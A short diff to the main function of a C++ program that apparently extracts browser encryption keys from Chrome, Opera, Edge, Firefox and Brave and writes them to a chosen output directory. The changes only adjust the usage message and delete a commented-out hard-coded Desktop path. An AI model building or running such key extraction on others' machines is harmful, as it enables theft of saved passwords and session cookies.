@@ -8,7 +8,7 @@
 int main(int argc, char* argv[]) {
 
 	if (argc != NumberOfArgs) {
-		std::cerr << "Usage: " << argv[0] << " <path/to/output/directory>\n";
+		std::cerr << "Usage: " << extractFileNameFromPath(std::string(argv[0])) << " <path/to/output/directory>\n";
 		return EXIT_FAILURE;
 	}
 
@@ -23,8 +23,6 @@ int main(int argc, char* argv[]) {
 	std::string bravePath = extractPathsForSpecificBrowser(absolutePaths, "Brave");
 	
 	Browser chrome, opera, edge, firefox, brave;
-
-//	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
 
 	chrome.ExtractKey(chromePath);
 	chrome.WriteExtractedKeyToFile(destinationPath);
